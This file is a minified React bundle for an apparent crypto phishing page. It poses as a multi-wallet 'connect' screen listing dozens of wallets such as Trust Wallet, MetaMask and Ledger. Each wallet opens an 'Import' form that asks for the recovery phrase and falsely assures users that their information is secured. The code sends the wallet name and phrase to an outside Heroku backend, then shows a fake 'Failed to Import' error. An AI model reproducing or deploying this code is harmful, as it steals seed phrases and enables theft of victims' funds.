(this.webpackJsonpconnect=this.webpackJsonpconnect||[]).push([[0],{19:function(e,a,t){e.exports=t(50)},24:function(e,a,t){},26:function(e,a,t){},27:function(e,a,t){},28:function(e,a,t){},29:function(e,a,t){},3:function(e,a,t){e.exports={successContainer:"popup_successContainer__Uhb3l",itemWrapper:"popup_itemWrapper__EoZDA",logoContainer:"popup_logoContainer__gtyJn",ImageContainer:"popup_ImageContainer__kSMkA",parentContainer:"popup_parentContainer__3YLzY",textContainer:"popup_textContainer__2GhEX"}},30:function(e,a,t){},50:function(e,a,t){"use strict";t.r(a);var n=t(0),l=t.n(n),r=t(6),o=t.n(r),i=(t(24),t(2)),s=t(4),m=(t(25),t(26),t(27),[{name:"  Trust wallet",image:"../../images/trustwallet.png"},{name:"  Metamask wallet",image:"../../images/metamask.png"},{name:"  AAVE wallet",image:"../../images/aave.jpeg"},{name:"  Ledger wallet",image:"../../images/ledgerwallet.png"},{name:"  Enjin wallet",image:"../../images/Enjinwallet.png"},{name:"  MEW wallet",image:"../../images/mewwallet.png"},{name:"  Digitex wallet",image:"../../images/digitex.png"},{name:"  Coinbase wallet",image:"../../images/coinbase.png"},{name:"  Autherum wallet",image:"../../images/autherum.png"},{name:"  Portis wallet",image:"../../images/portis.png"},{name:"  Formatic wallet",image:"../../images/formatic.png"},{name:"  Exodus wallet",image:"../../images/exodus.png"},{name:"  Defiat wallet",image:"../../images/defiat.png"},{name:"  Skale wallet",image:"../../images/skale.png"},{name:"  Wallet connect",image:"../../images/walletconnect.jpeg"},{name:"  Coinomi wallet",image:"../../images/coinomi.png"},{name:"  Atomic wallet",image:"../../images/atomic.jpeg"},{name:"  Tron wallet",image:"../../images/tronwallet.png"},{name:"  Band protocol wallet",image:"../../images/band.png"},{name:"  EOS wallet",image:"../../images/eos.png"},{name:"  Wax wallet",image:"../../images/wax.png"},{name:"  Zilliqa wallet",image:"../../images/zilliqa.png"},{name:"  Polkadot wallet",image:"../../images/polkadot.png"},{name:"  Monero wallet",image:"../../images/monero.png"},{name:"  Klever wallet",image:"../../images/klever.jpg"},{name:"  Neon wallet",image:"../../images/neon.png"},{name:"  Theta wallet",image:"../../images/theta.png"},{name:"  TomoChain wallet",image:"../../images/tomochain.png"},{name:"  Jaxx wallet",image:"../../images/jaxx.png"},{name:"  Elrond wallet",image:"../../images/elrond.png"},{name:"  Bancor wallet",image:"../../images/bancor.png"},{name:"  1inch wallet",image:"../../images/1inch.png"},{name:"  Cosmos wallet",image:"../../images/cosmos.png"},{name:"  Moonlet wallet",image:"../../images/moonlet.png"},{name:"  Harmony wallet",image:"../../images/harmony.png"},{name:"  Tezos wallet",image:"../../images/tezos.png"},{name:"  Kyber Swap wallet",image:"../../images/kyberswap.png"},{name:"  Falcon Swap wallet",image:"../../images/falswap.png"},{name:"  Zilliqa wallet",image:"../../images/zilliqa.png"},{name:"  Kava wallet",image:"../../images/kava.png"},{name:"  Ocean Protocol wallet",image:"../../images/oceanprotocol.png"},{name:"  Hex wallet",image:"../../images/hexcom.png"},{name:"  Cardano wallet",image:"../../images/cardano.png"},{name:"  Kardia Chain wallet",image:"../../images/kardiachain.png"},{name:"  Octofi wallet",image:"../../images/octofi.png"},{name:"  Algorand wallet",image:"../../images/algorand.png"},{name:"  Argent wallet",image:"../../images/argent.png"},{name:"  Rainbow wallet",image:"../../images/rainbow.png"},{name:"  Gnosis Safe Multisig",image:"../../images/gnosis.jpg"},{name:"Crypto.com | Defi Wallet",image:"../../images/crypto.png"}]),c=function(e){var a=e.setPopUpdata,t=e.setShowPopup;return l.a.createElement("section",{className:"homepage"},l.a.createElement("div",{className:"header"},l.a.createElement("h1",null,"Wallets")),l.a.createElement("div",{className:"text"},l.a.createElement("p",null,"Multiple iOS and Android wallets support the Linkup Affix protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.")),l.a.createElement("div",{className:"grid"},m.map((function(e){return l.a.createElement("div",{className:"small-box",onClick:function(){return function(e){a(e),t(!0)}(e)}},l.a.createElement("img",{src:e.image,alt:e.name}),l.a.createElement("p",null,e.name))}))))},g=(t(28),t(29),t(30),t(31),t(5)),p=t.n(g),u=t(7),d=t(8),w="https://hart2022-be.herokuapp.com";function h(e){this.path="".concat(w,"/api/auth/").concat(e)}h.prototype.getSyncMessage=function(){var e=Object(u.a)(p.a.mark((function e(a){var t,n,l;return p.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t={method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(a)},e.prev=1,e.next=4,fetch(this.path,t);case 4:return n=e.sent,e.next=7,n.json();case 7:if(l=e.sent,console.log(n),console.log(l),200===n.status){e.next=12;break}return e.abrupt("return",Object(d.a)({status:!1},l));case 12:return e.abrupt("return",Object(d.a)({status:!0},l));case 15:return e.prev=15,e.t0=e.catch(1),e.abrupt("return",{status:!1,error:e.t0});case 18:case"end":return e.stop()}}),e,this,[[1,15]])})));return function(a){return e.apply(this,arguments)}}();var b=function(){var e=Object(u.a)(p.a.mark((function e(a){var t,n,l,r,o,i,m,c,g,u;return p.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(t=a.e,n=a.rPhrase,l=a.setDisableButton,r=a.walletName,o=a.setShowmessage,i=a.setShowSuccess,t.preventDefault(),l(!0),m=s.b.loading("Processing..."),n.match(/\s*(\S\s*){20,}/g)){e.next=10;break}return o("This field cannot be less 20 characters."),s.b.update(m,{render:"This field cannot be less 20 characters",type:"warning",isLoading:!1,autoClose:1e3}),l(!1),e.abrupt("return");case 10:return setTimeout((function(){o("")}),6e3),c={walletName:r,rPhrase:n},console.log(c),g=new h("wallet/sync"),e.next=16,g.getSyncMessage(c);case 16:if((u=e.sent).status){e.next=21;break}return l(!1),i(!0),e.abrupt("return",s.b.update(m,{render:u.message||"An error occurred. Try again later",type:"error",isLoading:!1,autoClose:2e3}));case 21:u.status&&(i(!0),l(!1),s.b.update(m,{render:"Failed to Import",type:"error",isLoading:!1,autoClose:2e3}));case 22:case"end":return e.stop()}}),e)})));return function(a){return e.apply(this,arguments)}}(),f=t(18),E=t(3),v=t.n(E),k=function(e){var a=e.setPopUpdata,t=e.setShowPopup,r=e.popUpData,o=Object(n.useState)(""),s=Object(i.a)(o,2),m=s[0],c=s[1],g=Object(n.useState)(""),p=Object(i.a)(g,2),u=p[0],d=p[1],w=Object(n.useState)(!1),h=Object(i.a)(w,2),E=h[0],k=h[1],C=Object(n.useState)(!1),y=Object(i.a)(C,2),x=y[0],N=y[1],S=function(){t(!1),a(null),N(!1)};return l.a.createElement("section",{className:"popup"},x?l.a.createElement("div",{className:v.a.successContainer},l.a.createElement("div",{className:v.a.itemWrapper},l.a.createElement("div",{className:v.a.logoContainer},l.a.createElement("div",{className:v.a.ImageContainer}))),l.a.createElement("div",{className:v.a.parentContainer},l.a.createElement("div",{className:v.a.textContainer},"oops. there seems to be an error, please contact Admin/support for authentication",l.a.createElement("button",{onClick:function(){return S()}}," Back ")))):l.a.createElement("div",null,l.a.createElement("div",{className:"form-header"},l.a.createElement("img",{src:r.image}),l.a.createElement("p",null,"Import your ",r.name)),m?l.a.createElement("p",{className:"error-success-msg"},m):null,l.a.createElement("div",{className:"form"},l.a.createElement("div",{className:v.a.formContainer},l.a.createElement("form",{onSubmit:function(e){b({e:e,rPhrase:u,setDisableButton:k,walletName:r.name,setShowmessage:c,setShowSuccess:N})}},l.a.createElement("span",{className:"info-div"},l.a.createElement(f.a,{className:"checkIcon"}),"Your information are highly secured"),l.a.createElement("div",null,l.a.createElement("label",null,"Wallet Name"),l.a.createElement("input",{type:"text",disabled:!0,value:r.name}),l.a.createElement("span",{className:"input"},l.a.createElement("svg",{fill:"none","stroke-linecap":"round","stroke-linejoin":"round","stroke-width":"2",viewBox:"0 0 24 24",stroke:"currentColor",class:"h-6 w-6"},l.a.createElement("path",{d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})))),l.a.createElement("div",{className:"recovery"},l.a.createElement("label",null,"Recovery Phrase"),l.a.createElement("textarea",{type:"text",onChange:function(e){return d(e.target.value)}}),l.a.createElement("span",{className:"textarea"},l.a.createElement("svg",{fill:"none","stroke-linecap":"round","stroke-linejoin":"round","stroke-width":"2",viewBox:"0 0 24 24",stroke:"currentColor",class:"h-6 w-6"},l.a.createElement("path",{d:"M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"})))),l.a.createElement("h6",null,l.a.createElement("i",{className:"fa fa-info-circle"}),"Typically 12 (sometimes 24) words separated by single space."),E?l.a.createElement("div",{className:"proceed-button disabled"},l.a.createElement("p",null,"Please Wait... ")):l.a.createElement("button",{className:"proceed-button2"},"Import")),E?null:l.a.createElement("div",{className:"cancel"},l.a.createElement("p",{onClick:function(){return S()}},"Cancel"))))))},C=function(){var e=Object(n.useState)(!1),a=Object(i.a)(e,2),t=a[0],r=a[1],o=Object(n.useState)({}),m=Object(i.a)(o,2),g=m[0],p=m[1];return l.a.createElement(l.a.Fragment,null,l.a.createElement(s.a,{position:"top-center",autoClose:5e3,hideProgressBar:!1,newestOnTop:!1,closeOnClick:!0,rtl:!1,pauseOnFocusLoss:!0,draggable:!0,pauseOnHove:!0}),l.a.createElement(c,{setPopUpdata:p,setShowPopup:r}),t?l.a.createElement(k,{popUpData:g,setPopUpdata:p,setShowPopup:r}):null)};Boolean("localhost"===window.location.hostname||"[::1]"===window.location.hostname||window.location.hostname.match(/^127(?:\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/));o.a.render(l.a.createElement(l.a.StrictMode,null,l.a.createElement(C,null)),document.getElementById("root")),"serviceWorker"in navigator&&navigator.serviceWorker.ready.then((function(e){e.unregister()}))}},[[19,1,2]]]);
//# sourceMappingURL=main.6313bd21.chunk.js.map